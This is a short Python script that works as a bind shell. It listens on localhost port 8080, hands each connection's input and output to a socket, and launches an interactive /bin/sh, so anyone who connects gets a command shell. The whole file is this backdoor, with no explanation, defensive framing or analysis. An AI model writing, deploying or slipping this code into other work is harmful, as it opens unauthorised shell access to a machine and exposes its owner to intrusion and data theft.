import os
import socket
import subprocess

IP = "localhost"
PORT = 8080

s = socket.socket()
s.bind((IP, PORT))
s.listen()

while True:
    connection, client = s.accept()
    os.dup2(connection.fileno(), 0)
    os.dup2(connection.fileno(), 1)
    os.dup2(connection.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
